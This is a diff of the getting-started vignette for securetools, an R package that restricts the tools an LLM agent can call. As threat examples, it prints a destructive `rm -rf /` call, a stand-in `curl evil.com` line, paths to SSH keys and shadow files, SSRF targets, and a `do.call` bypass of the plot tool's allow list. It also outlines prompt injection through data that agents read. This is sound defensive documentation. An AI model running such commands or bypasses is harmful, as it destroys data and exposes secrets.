@@ -5,12 +5,16 @@
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>Getting Started with securetools • securetools</title>
+<title>Getting started with securetools • securetools</title>
 <script src="../deps/jquery-3.6.0/jquery-3.6.0.min.js"></script><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <link href="../deps/bootstrap-5.3.8/bootstrap.min.css" rel="stylesheet">
-<script src="../deps/bootstrap-5.3.8/bootstrap.bundle.min.js"></script><link href="../deps/font-awesome-6.5.2/css/all.min.css" rel="stylesheet">
+<script src="../deps/bootstrap-5.3.8/bootstrap.bundle.min.js"></script><link href="../deps/Hanken_Grotesk-0.4.10/font.css" rel="stylesheet">
+<link href="../deps/Space_Mono-0.4.10/font.css" rel="stylesheet">
+<link href="../deps/Fraunces-0.4.10/font.css" rel="stylesheet">
+<link href="../deps/font-awesome-6.5.2/css/all.min.css" rel="stylesheet">
 <link href="../deps/font-awesome-6.5.2/css/v4-shims.min.css" rel="stylesheet">
-<script src="../deps/headroom-0.11.0/headroom.min.js"></script><script src="../deps/headroom-0.11.0/jQuery.headroom.min.js"></script><script src="../deps/bootstrap-toc-1.0.1/bootstrap-toc.min.js"></script><script src="../deps/clipboard.js-2.0.11/clipboard.min.js"></script><script src="../deps/search-1.0.0/autocomplete.jquery.min.js"></script><script src="../deps/search-1.0.0/fuse.min.js"></script><script src="../deps/search-1.0.0/mark.min.js"></script><!-- pkgdown --><script src="../pkgdown.js"></script><meta property="og:title" content="Getting Started with securetools">
+<script src="../deps/headroom-0.11.0/headroom.min.js"></script><script src="../deps/headroom-0.11.0/jQuery.headroom.min.js"></script><script src="../deps/bootstrap-toc-1.0.1/bootstrap-toc.min.js"></script><script src="../deps/clipboard.js-2.0.11/clipboard.min.js"></script><script src="../deps/search-1.0.0/autocomplete.jquery.min.js"></script><script src="../deps/search-1.0.0/fuse.min.js"></script><script src="../deps/search-1.0.0/mark.min.js"></script><!-- pkgdown --><script src="../pkgdown.js"></script><link href="../extra.css" rel="stylesheet">
+<meta property="og:title" content="Getting started with securetools">
 </head>
 <body>
     <a href="#main" class="visually-hidden-focusable">Skip to contents</a>
@@ -52,7 +56,7 @@
 <div class="row">
   <main id="main" class="col-md-9"><div class="page-header">
 
-      <h1>Getting Started with securetools</h1>
+      <h1>Getting started with securetools</h1>
             
       
       <small class="dont-index">Source: <a href="https://github.com/ian-flores/securetools/blob/main/vignettes/securetools.Rmd" class="external-link"><code>vignettes/securetools.Rmd</code></a></small>
@@ -62,41 +66,31 @@
     
     
 <div class="section level2">
-<h2 id="why-security-hardened-tools">Why security-hardened tools?<a class="anchor" aria-label="anchor" href="#why-security-hardened-tools"></a>
+<h2 id="why-tools-need-limits">Why tools need limits<a class="anchor" aria-label="anchor" href="#why-tools-need-limits"></a>
 </h2>
-<p>When you give an LLM agent access to tools, you hand executable
-capabilities to a system trained to be helpful, not safe. A model that
-can call <code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code> can run arbitrary shell commands. A model
-with unrestricted file write can overwrite <code>/etc/passwd</code> or
-plant a reverse shell. Raw SQL access lets a model
-<code>DROP TABLE users</code> or exfiltrate every row from your
-production database.</p>
-<p>These are not theoretical risks. Research on prompt injection and
-adversarial tool use has shown that LLM agents will follow
-carefully-crafted instructions embedded in untrusted data – a
-user-uploaded CSV, a web page fetched by the agent, a crafted column
-name in a database result. If the tools have no safety boundaries, a
-single successful injection compromises the host system.</p>
-<p>securetools provides pre-built tool definitions with structural
-security constraints. The tool physically cannot access files outside
-allowed directories. It accepts structured parameters and constructs
-parameterized queries internally. The agent never sees raw SQL, raw file
-paths outside the sandbox, or unrestricted HTTP access.</p>
+<p>A tool you give an LLM agent is code the model can run whenever it
+decides to. If the model can call <code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code>, it can run any
+shell command. If it can write files anywhere, it can overwrite
+something you care about. If it can send raw SQL, it can drop a table or
+read every row.</p>
+<p>The model doesn’t have to be badly behaved for this to go wrong.
+Prompt injection works by hiding instructions in data the agent reads: a
+CSV it was asked to summarize, a web page it fetched, a column name in a
+query result. Agents often follow those instructions. If the tools have
+no limits, one successful injection is enough to do real damage.</p>
+<p>securetools has ready-made tools for <a href="https://github.com/ian-flores/securer" class="external-link">securer</a> with the limits
+built in. The file tools can’t reach outside the folders you list. The
+SQL tool takes a table, columns, and a filter, and writes the query
+itself. The URL tool only talks to the domains you allow.</p>
+<p>Each <code>tool_*()</code> function returns a
+<code><a href="https://ian-flores.github.io/securer/reference/securer_tool.html" class="external-link">securer::securer_tool()</a></code> object, which you pass to a
+<code>SecureSession</code>.</p>
 </div>
 <div class="section level2">
-<h2 id="overview">Overview<a class="anchor" aria-label="anchor" href="#overview"></a>
+<h2 id="how-a-tool-call-runs">How a tool call runs<a class="anchor" aria-label="anchor" href="#how-a-tool-call-runs"></a>
 </h2>
-<p>securetools provides pre-built, security-hardened tool definitions
-for use with <a href="https://github.com/ian-flores/securer" class="external-link">securer</a>. Each tool
-factory returns a <code><a href="https://ian-flores.github.io/securer/reference/securer_tool.html" class="external-link">securer::securer_tool()</a></code> object with
-built-in constraints: path scoping, parameterized SQL, domain
-allow-lists, size limits, and rate limiting.</p>
-</div>
-<div class="section level2">
-<h2 id="how-tool-execution-works">How tool execution works<a class="anchor" aria-label="anchor" href="#how-tool-execution-works"></a>
-</h2>
-<p>Every securetools call follows the same execution flow. Validation
-happens in the parent process, which the sandbox cannot influence.</p>
+<p>Validation happens in your main R session (the parent process), not
+in the sandbox.</p>
 <pre><code>  LLM Agent                 Parent Process (R)              Sandbox (securer)
   =========                 ==================              =================
       |                            |                               |
@@ -116,11 +110,11 @@ happens in the parent process, which the sandbox cannot influence.</p>
       |                            |&lt;------------- Result ---------|
       |                            |                               |
       |&lt;--- result/error ----------|                               |</code></pre>
-<p>Validation runs in the parent process, which the sandboxed code
-cannot modify or bypass. Even if a sandbox escape were possible, the
-parent-level checks (path scoping, rate limits, SQL parameterization)
-still apply because they execute before the call reaches the
-sandbox.</p>
+<p>When code in the sandbox calls a tool, securer sends the call to the
+parent. The parent checks the arguments and, if they pass, runs the
+tool’s function and sends the result back. Because both the checks and
+the tool itself run in the parent, code in the sandbox can’t change or
+skip them.</p>
 </div>
 <div class="section level2">
 <h2 id="installation">Installation<a class="anchor" aria-label="anchor" href="#installation"></a>
@@ -130,25 +124,21 @@ sandbox.</p>
 <span><span class="fu">pak</span><span class="fu">::</span><span class="fu"><a href="https://pak.r-lib.org/reference/pak.html" class="external-link">pak</a></span><span class="op">(</span><span class="st">"ian-flores/securetools"</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level2">
-<h2 id="quick-example">Quick example<a class="anchor" aria-label="anchor" href="#quick-example"></a>
+<h2 id="the-tools">The tools<a class="anchor" aria-label="anchor" href="#the-tools"></a>
 </h2>
 <div class="sourceCode" id="cb3"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ian-flores.github.io/securetools/">securetools</a></span><span class="op">)</span></span>
 <span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ian-flores.github.io/securer/" class="external-link">securer</a></span><span class="op">)</span></span></code></pre></div>
 <div class="section level3">
-<h3 id="calculator-tool">Calculator tool<a class="anchor" aria-label="anchor" href="#calculator-tool"></a>
+<h3 id="calculator">Calculator<a class="anchor" aria-label="anchor" href="#calculator"></a>
 </h3>
-<p>The threat: an LLM asked to “calculate” something might generate
-arbitrary R code instead of a simple arithmetic expression. Without
-validation, <code>calculator(expression = "system('rm -rf /')")</code>
-would execute a destructive shell command. Code injection through
-expression evaluation is a well-understood attack vector.</p>
-<p>The calculator tool evaluates mathematical expressions safely via AST
-validation. It parses the expression into an abstract syntax tree and
-walks every node, verifying that only arithmetic operators, math
-functions, and numeric literals are present. Variable access,
-assignment, and arbitrary function calls are all rejected before
-evaluation ever occurs.</p>
+<p>If you hand a model a calculator that just evaluates R, nothing stops
+it from sending
+<code>calculator(expression = "system('rm -rf /')")</code>.</p>
+<p><code><a href="../reference/tool_calculator.html">tool_calculator()</a></code> parses the expression and walks the
+parse tree before running anything. Every function and name has to be on
+a short list of arithmetic and math functions. Variables, assignment,
+and any other function call are rejected, and nothing is evaluated.</p>
 <div class="sourceCode" id="cb4"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">calc</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/tool_calculator.html">tool_calculator</a></span><span class="op">(</span><span class="op">)</span></span>
 <span><span class="va">session</span> <span class="op">&lt;-</span> <span class="va"><a href="https://ian-flores.github.io/securer/reference/SecureSession.html" class="external-link">SecureSession</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span>tools <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span><span class="va">calc</span><span class="op">)</span><span class="op">)</span></span>
@@ -156,25 +146,26 @@ evaluation ever occurs.</p>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="st">'calculator(expression = "sqrt(144) + 2^3")'</span><span class="op">)</span></span>
 <span><span class="co">#&gt; [1] 20</span></span>
 <span></span>
-<span><span class="co"># This is rejected; system() is not an allowed function:</span></span>
+<span><span class="co"># Rejected: system() isn't on the list</span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="st">'calculator(expression = "system(\'whoami\')")'</span><span class="op">)</span></span>
-<span><span class="co">#&gt; Error: Function not allowed in calculator: `system`</span></span>
+<span><span class="co">#&gt; Error: Function not allowed in calculator: `system()`</span></span>
 <span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level3">
-<h3 id="file-io-tools">File I/O tools<a class="anchor" aria-label="anchor" href="#file-io-tools"></a>
+<h3 id="reading-and-writing-files">Reading and writing files<a class="anchor" aria-label="anchor" href="#reading-and-writing-files"></a>
 </h3>
-<p>The threat: an agent with unrestricted file access can read secrets
-(<code>~/.ssh/id_rsa</code>, <code>.env</code> files,
-<code>/etc/shadow</code>) or write to sensitive locations. Path
-traversal attacks using <code>../../</code> sequences or symlinks let an
-attacker escape any intended directory. An agent might also exhaust disk
-space by writing extremely large files in a loop.</p>
-<p>File I/O tools enforce path scoping with symlink resolution, size
-limits, and directory allow-lists. Reading and writing are scoped
-independently so you can give an agent read access to source data
-without granting write access to the same directory:</p>
+<p>An agent that can read any file can read <code>~/.ssh/id_rsa</code>
+or a <code>.env</code> file. One that can write anywhere can fill the
+disk or replace files outside the project. Paths like
+<code>../../</code> and symlinks are the usual ways out of a folder.</p>
+<p><code><a href="../reference/tool_read_file.html">tool_read_file()</a></code> and <code><a href="../reference/tool_write_file.html">tool_write_file()</a></code> take
+a list of allowed folders. Paths are resolved, symlinks included, before
+they’re compared with that list. Both tools have a size limit, and the
+writer won’t overwrite an existing file unless you set
+<code>overwrite = TRUE</code>. Reading and writing are set up
+separately, so you can let an agent read from one folder and write only
+to another.</p>
 <div class="sourceCode" id="cb5"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="co"># Only allow access to a specific directory</span></span>
 <span><span class="va">data_dir</span> <span class="op">&lt;-</span> <span class="st">"/path/to/project/data"</span></span>
@@ -212,30 +203,27 @@ without granting write access to the same directory:</p>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level3">
-<h3 id="sql-query-tool">SQL query tool<a class="anchor" aria-label="anchor" href="#sql-query-tool"></a>
+<h3 id="sql-queries">SQL queries<a class="anchor" aria-label="anchor" href="#sql-queries"></a>
 </h3>
-<p>The threat: SQL injection is a well-known attack class. An LLM given
-a raw SQL interface can be tricked (via prompt injection in user data or
-fetched content) into running <code>DROP TABLE</code>,
-<code>UNION SELECT</code> for data exfiltration, or
-<code>INSERT</code>/<code>UPDATE</code> to tamper with records.
-Parameterized queries help, but they still require the developer to use
-them correctly.</p>
-<p>securetools eliminates the attack surface entirely: the agent never
-writes SQL at all. The <code><a href="../reference/tool_query_sql.html">tool_query_sql()</a></code> exposes a
-structured interface where the agent specifies a table name, column
-list, and optional filter. The tool constructs the SQL internally using
-parameterized queries. Injection is structurally impossible because the
-agent has no mechanism to supply raw SQL strings:</p>
+<p>If an agent can send raw SQL, a prompt injection can get it to run
+<code>DROP TABLE</code>, a <code>UNION SELECT</code> that pulls data
+from other tables, or an <code>UPDATE</code>. Parameterized queries
+help, but only when every query uses them correctly.</p>
+<p><code><a href="../reference/tool_query_sql.html">tool_query_sql()</a></code> doesn’t take SQL at all. The agent
+names a table, the columns it wants, and an optional filter, and the
+tool builds the query. The filter value is sent as a query parameter,
+never pasted into the SQL:</p>
 <pre><code>  Agent Request                           Tool Internals
   =============                           ==============
   table = "users"             ---&gt;   SELECT name, email
   columns = "name, email"           FROM users
   filter_column = "active"          WHERE active = ?
   filter_value = "1"                 [bound: "1"]</code></pre>
-<p>The table and column names are validated against allow-lists. Only
-pre-approved tables can be queried, and column names are checked for SQL
-injection patterns before being interpolated into the query.</p>
+<p>The table has to be in <code>allowed_tables</code>. Column names
+aren’t checked against a list, but they must be plain identifiers
+(letters, digits, and underscores), and table and column names are
+quoted with <code><a href="https://dbi.r-dbi.org/reference/dbQuoteIdentifier.html" class="external-link">DBI::dbQuoteIdentifier()</a></code>. Results are capped at
+<code>max_rows</code>.</p>
 <div class="sourceCode" id="cb7"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://dbi.r-dbi.org" class="external-link">DBI</a></span><span class="op">)</span></span>
 <span><span class="va">con</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://dbi.r-dbi.org/reference/dbConnect.html" class="external-link">dbConnect</a></span><span class="op">(</span><span class="fu">RSQLite</span><span class="fu">::</span><span class="fu"><a href="https://rsqlite.r-dbi.org/reference/SQLite.html" class="external-link">SQLite</a></span><span class="op">(</span><span class="op">)</span>, <span class="st">"app.db"</span><span class="op">)</span></span>
@@ -263,19 +251,26 @@ injection patterns before being interpolated into the query.</p>
 <span><span class="fu"><a href="https://dbi.r-dbi.org/reference/dbDisconnect.html" class="external-link">dbDisconnect</a></span><span class="op">(</span><span class="va">con</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level3">
-<h3 id="url-fetch-tool">URL fetch tool<a class="anchor" aria-label="anchor" href="#url-fetch-tool"></a>
+<h3 id="fetching-urls">Fetching URLs<a class="anchor" aria-label="anchor" href="#fetching-urls"></a>
 </h3>
-<p>The threat: an agent with unrestricted HTTP access can perform
-Server-Side Request Forgery (SSRF), making requests to internal services
-(<code>http://169.254.169.254</code> for cloud metadata,
-<code>http://localhost:8080</code> for internal APIs) that are invisible
-from the public internet. It can also exfiltrate data by POSTing to
-attacker-controlled endpoints, or overwhelm external APIs with unbounded
-request loops.</p>
-<p>The URL fetch tool constrains network access with domain allow-lists
-(using glob patterns for subdomain matching), protocol restrictions
-(HTTP/HTTPS only), private IP blocking, response size limits, and rate
-limiting:</p>
+<p>With open network access, an agent can reach services that aren’t
+meant to be public, like a cloud metadata endpoint at
+<code>http://169.254.169.254</code> or an internal API on
+<code>http://localhost:8080</code>. This is server-side request forgery
+(SSRF). It can also send data out to a server an attacker controls, or
+hit an API in a loop.</p>
+<p><code><a href="../reference/tool_fetch_url.html">tool_fetch_url()</a></code> only allows GET and HEAD over HTTP or
+HTTPS. The host must match <code>allowed_domains</code>, where
+<code>*.example.com</code> matches any subdomain of
+<code>example.com</code> but not <code>example.com</code> itself. The
+tool looks up the host’s IP address once, refuses private and loopback
+addresses (and all IPv6 addresses), and then connects to that address so
+a second DNS answer can’t send it somewhere else. It doesn’t follow
+redirects, and it caps the response size and the number of calls per
+minute.</p>
+<p>HTTPS requests currently fail. Connecting by IP address breaks the
+TLS certificate check, so the example below errors until that is fixed.
+Plain HTTP works.</p>
 <div class="sourceCode" id="cb8"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">fetcher</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/tool_fetch_url.html">tool_fetch_url</a></span><span class="op">(</span></span>
 <span>  allowed_domains <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"api.github.com"</span>, <span class="st">"*.githubusercontent.com"</span><span class="op">)</span>,</span>
@@ -294,13 +289,12 @@ limiting:</p>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level3">
-<h3 id="data-profiling">Data profiling<a class="anchor" aria-label="anchor" href="#data-profiling"></a>
+<h3 id="profiling-data">Profiling data<a class="anchor" aria-label="anchor" href="#profiling-data"></a>
 </h3>
-<p>The threat: profiling enormous datasets without limits can exhaust
-memory and crash the host process. The <code><a href="../reference/tool_data_profile.html">tool_data_profile()</a></code>
-enforces row limits through sampling, so multi-million-row data frames
-are summarized safely without consuming all available memory.</p>
-<p>Compute summary statistics for data frames:</p>
+<p>Summarizing a very large data frame can use a lot of memory.
+<code><a href="../reference/tool_data_profile.html">tool_data_profile()</a></code> profiles a random sample of
+<code>max_rows</code> rows when the data is bigger than that, and says
+in its result that it sampled.</p>
 <div class="sourceCode" id="cb9"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">profiler</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/tool_data_profile.html">tool_data_profile</a></span><span class="op">(</span>max_rows <span class="op">=</span> <span class="fl">100000</span><span class="op">)</span></span>
 <span><span class="va">session</span> <span class="op">&lt;-</span> <span class="va"><a href="https://ian-flores.github.io/securer/reference/SecureSession.html" class="external-link">SecureSession</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span>tools <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span><span class="va">profiler</span><span class="op">)</span><span class="op">)</span></span>
@@ -313,17 +307,21 @@ are summarized safely without consuming all available memory.</p>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level3">
-<h3 id="plot-tool">Plot tool<a class="anchor" aria-label="anchor" href="#plot-tool"></a>
+<h3 id="plots">Plots<a class="anchor" aria-label="anchor" href="#plots"></a>
 </h3>
-<p>The threat: R’s plotting system is powerful enough to execute
-arbitrary code. An expression like
-<code>plot(x); system("curl evil.com")</code> embeds a system call
-inside what looks like plotting code. Without restrictions, the plot
-tool becomes a general-purpose code execution backdoor.</p>
-<p>The plot tool evaluates plot expressions in a restricted environment
-where only safe base R and graphics functions are available. Output is
-also path-scoped and size-limited to prevent writing oversized files to
-arbitrary locations:</p>
+<p>Plotting code is still R code.
+<code>plot(x); system("curl evil.com")</code> looks like a plot but also
+runs a shell command.</p>
+<p><code><a href="../reference/tool_plot.html">tool_plot()</a></code> parses the code first and rejects any
+function that isn’t on its list of graphics, math, and data functions.
+That check is weaker than it sounds; see the known limitations below.
+The plot is written to a temporary file, checked against
+<code>max_file_size</code>, and then copied to a path inside
+<code>allowed_dirs</code>.</p>
+<p>At the moment only <code><a href="https://rdrr.io/r/graphics/plot.default.html" class="external-link">plot()</a></code> itself works. The code runs
+with only the base package visible, so functions from graphics such as
+<code><a href="https://rdrr.io/r/graphics/hist.html" class="external-link">hist()</a></code>, <code><a href="https://rdrr.io/r/graphics/lines.html" class="external-link">lines()</a></code>, and <code><a href="https://rdrr.io/r/graphics/barplot.html" class="external-link">barplot()</a></code>
+aren’t found, and the example below fails until that is fixed.</p>
 <div class="sourceCode" id="cb10"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">plotter</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/tool_plot.html">tool_plot</a></span><span class="op">(</span></span>
 <span>  allowed_dirs <span class="op">=</span> <span class="st">"/path/to/output"</span>,</span>
@@ -337,179 +335,151 @@ arbitrary locations:</p>
 <span><span class="st">    path = "/path/to/output/chart.png",</span></span>
 <span><span class="st">    plot_code = "hist(rnorm(1000), main = \"Distribution\")",</span></span>
 <span><span class="st">    width = 8,</span></span>
-<span><span class="st">    height = 6</span></span>
+<span><span class="st">    height = 6,</span></span>
+<span><span class="st">    format = "auto"</span></span>
 <span><span class="st">  )</span></span>
 <span><span class="st">'</span><span class="op">)</span></span>
 <span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level3">
-<h3 id="r-help-lookup">R help lookup<a class="anchor" aria-label="anchor" href="#r-help-lookup"></a>
+<h3 id="r-help">R help<a class="anchor" aria-label="anchor" href="#r-help"></a>
 </h3>
-<p>The threat: unrestricted documentation lookup might seem harmless,
-but it can leak information about installed packages and system
-configuration. The <code>allowed_packages</code> parameter restricts
-which packages can be queried, keeping the agent’s awareness scoped to
-what you intend.</p>
-<p>The <code><a href="../reference/tool_r_help.html">tool_r_help()</a></code> gives safe access to R
-documentation:</p>
+<p>Looking up help pages seems harmless, but it tells the agent which
+packages you have installed. <code><a href="../reference/tool_r_help.html">tool_r_help()</a></code> only returns
+pages from the packages in <code>allowed_packages</code>, and cuts each
+page off at <code>max_lines</code> lines.</p>
 <div class="sourceCode" id="cb11"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">help_tool</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/tool_r_help.html">tool_r_help</a></span><span class="op">(</span>allowed_packages <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"base"</span>, <span class="st">"stats"</span>, <span class="st">"utils"</span><span class="op">)</span><span class="op">)</span></span>
 <span></span>
 <span><span class="va">session</span> <span class="op">&lt;-</span> <span class="va"><a href="https://ian-flores.github.io/securer/reference/SecureSession.html" class="external-link">SecureSession</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span>tools <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span><span class="va">help_tool</span><span class="op">)</span><span class="op">)</span></span>
 <span></span>
 <span><span class="co"># Look up documentation for a function</span></span>
-<span><span class="va">result</span> <span class="op">&lt;-</span> <span class="va">session</span><span class="op">$</span><span class="fu">call</span><span class="op">(</span><span class="st">"r_help"</span>, topic <span class="op">=</span> <span class="st">"mean"</span>, package <span class="op">=</span> <span class="st">"base"</span><span class="op">)</span></span>
+<span><span class="va">result</span> <span class="op">&lt;-</span> <span class="va">session</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="st">'r_help(topic = "mean", package = "base")'</span><span class="op">)</span></span>
 <span><span class="fu"><a href="https://rdrr.io/r/base/cat.html" class="external-link">cat</a></span><span class="op">(</span><span class="va">result</span><span class="op">)</span></span>
 <span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 </div>
 </div>
 <div class="section level2">
-<h2 id="security-model">Security model<a class="anchor" aria-label="anchor" href="#security-model"></a>
+<h2 id="what-the-tools-protect-against">What the tools protect against<a class="anchor" aria-label="anchor" href="#what-the-tools-protect-against"></a>
 </h2>
-<p>Every tool enforces constraints at the parent process level, not in
-the sandbox. This means even if the sandbox is somehow bypassed,
-tool-level protections still hold:</p>
+<p>The checks run in the parent process. Here is what each one is
+for:</p>
 <ul>
-<li>Path scoping: symlinks are resolved before checking allowed
-directories</li>
-<li>Parameterized SQL: structured interface prevents injection by
-design</li>
-<li>Domain allow-lists: URL validation before any HTTP request</li>
-<li>Size limits: checked after serialization (write) or before
-processing (read)</li>
-<li>Rate limiting: per-tool lifetime and/or sliding window limits</li>
-<li>AST validation: calculator expression safety via recursive AST
-walking</li>
+<li>Reading secret files: paths are resolved, symlinks included, and
+must be inside an allowed folder.</li>
+<li>Writing to the wrong place: write paths are checked the same way,
+and checked again after the file is written.</li>
+<li>Running arbitrary code: the calculator and plot tools reject
+functions that aren’t on their lists (the plot tool has a known gap,
+below).</li>
+<li>Reaching internal services: the URL tool only allows HTTP and HTTPS,
+allowed domains, and public IP addresses.</li>
+<li>SQL injection: the agent never writes SQL, and filter values are
+passed as parameters.</li>
+<li>Runaway use: every tool has an optional call limit, and the file,
+plot, and URL tools have size limits.</li>
 </ul>
-</div>
-<div class="section level2">
-<h2 id="security-considerations">Security considerations<a class="anchor" aria-label="anchor" href="#security-considerations"></a>
-</h2>
-<div class="section level3">
-<h3 id="threat-model">Threat model<a class="anchor" aria-label="anchor" href="#threat-model"></a>
-</h3>
-<p>securetools protects against an untrusted LLM agent attempting
-to:</p>
-<ul>
-<li>Read sensitive files: path validation with symlink resolution
-prevents directory traversal</li>
-<li>Write to arbitrary locations: write paths are validated against
-allowed directories</li>
-<li>Execute arbitrary code: calculator uses AST validation; plot tool
-restricts to plotting functions</li>
-<li>Access internal services (SSRF): URL fetching validates protocols
-(HTTP/HTTPS only) and blocks private IPs</li>
-<li>SQL injection: structured query interface with parameterized filters
-prevents raw SQL injection</li>
-<li>Resource exhaustion: rate limiting and size limits constrain
-resource usage</li>
-</ul>
-</div>
 <div class="section level3">
 <h3 id="known-limitations">Known limitations<a class="anchor" aria-label="anchor" href="#known-limitations"></a>
 </h3>
 <ul>
-<li>TOCTOU races: between path validation and file I/O, a symlink could
-theoretically be swapped. Use <code>validate_written_path()</code> for
-post-write verification.</li>
-<li>Rate limiting is per-process: limits reset if the R process
-restarts. For persistent rate limiting, use an external mechanism.</li>
-<li>DNS rebinding: the private IP check resolves DNS before the request,
-but DNS rebinding attacks could bypass this.</li>
-<li>Base R access in restricted environments: the plot tool’s restricted
-environment still provides access to safe base R functions. The
-allowlist is comprehensive but may need updates for new R versions.</li>
+<li>Between checking a path and writing to it, someone with access to
+the folder could swap in a symlink. The write and plot tools check the
+path again after writing and delete the file if it ended up outside the
+allowed folders, but the write has already happened by then.</li>
+<li>Call limits live in memory. They reset when the R process restarts.
+If you need limits that last, enforce them outside R.</li>
+<li>The plot tool is not safe for untrusted code yet. Its allow list
+includes <code><a href="https://rdrr.io/r/base/do.call.html" class="external-link">do.call()</a></code>, and the code runs with base R visible,
+so <code>do.call("system", list("ls"))</code> gets past the check and
+runs. Until this is fixed, only use <code><a href="../reference/tool_plot.html">tool_plot()</a></code> inside a
+sandboxed session.</li>
+<li>
+<code><a href="../reference/tool_fetch_url.html">tool_fetch_url()</a></code> can’t fetch HTTPS URLs yet (see
+above).</li>
+<li>Passing a data frame the size of <code>iris</code> or
+<code>mtcars</code> to <code>data_profile()</code> from inside a
+<code>SecureSession</code> currently fails while the data is sent
+between processes. Small data frames work, and calling the tool directly
+with <code>profiler@fn(iris)</code> works.</li>
 </ul>
 </div>
 <div class="section level3">
-<h3 id="working-with-securesession">Working with SecureSession<a class="anchor" aria-label="anchor" href="#working-with-securesession"></a>
+<h3 id="calling-tools-through-a-securesession">Calling tools through a SecureSession<a class="anchor" aria-label="anchor" href="#calling-tools-through-a-securesession"></a>
 </h3>
-<p>When tools are called through <code>SecureSession</code> IPC, all
-tool arguments must be specified explicitly. The child process wrappers
-do not carry default values from the tool factory. For example, always
-specify <code>format = "auto"</code> even though it’s the default in
-direct usage.</p>
+<p>Inside a <code>SecureSession</code>, the tool functions don’t keep
+the default argument values from the factory. Pass every argument, even
+ones with a default like <code>format = "auto"</code>.</p>
 </div>
 </div>
 <div class="section level2">
-<h2 id="rate-limiting">Rate limiting<a class="anchor" aria-label="anchor" href="#rate-limiting"></a>
+<h2 id="call-limits">Call limits<a class="anchor" aria-label="anchor" href="#call-limits"></a>
 </h2>
-<p>Agent loops are unbounded by default. A ReAct agent keeps calling
-tools until it decides it has an answer or hits a token limit. Without
-rate limiting, a confused or manipulated agent could make thousands of
-API calls, exhaust disk I/O, or run up cloud costs. Rate limits impose a
-hard boundary independent of the LLM’s decision-making.</p>
-<p>All tool factories accept <code>max_calls</code> for lifetime rate
-limiting. Some tools (like <code><a href="../reference/tool_fetch_url.html">tool_fetch_url()</a></code>) also support
-<code>max_calls_per_minute</code> for sliding-window throttling. When a
-limit is hit, the tool returns an error message to the LLM rather than
-silently failing, giving the agent a chance to adjust its strategy:</p>
+<p>An agent loop keeps calling tools until the model decides it’s done
+or runs out of tokens. A confused or manipulated agent can make
+thousands of calls. A call limit stops it no matter what the model
+decides.</p>
+<p>Every tool takes <code>max_calls</code>, a limit on the total number
+of calls. <code><a href="../reference/tool_fetch_url.html">tool_fetch_url()</a></code> also takes
+<code>max_calls_per_minute</code>. When a limit is reached, the tool
+raises an error, and the agent can see that error and change course.</p>
 <div class="sourceCode" id="cb12"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="co"># Allow only 100 calculator evaluations per session</span></span>
 <span><span class="va">calc</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/tool_calculator.html">tool_calculator</a></span><span class="op">(</span>max_calls <span class="op">=</span> <span class="fl">100</span><span class="op">)</span></span>
 <span></span>
 <span><span class="co"># URL fetch with both lifetime and per-minute limits</span></span>
 <span><span class="va">fetcher</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/tool_fetch_url.html">tool_fetch_url</a></span><span class="op">(</span></span>
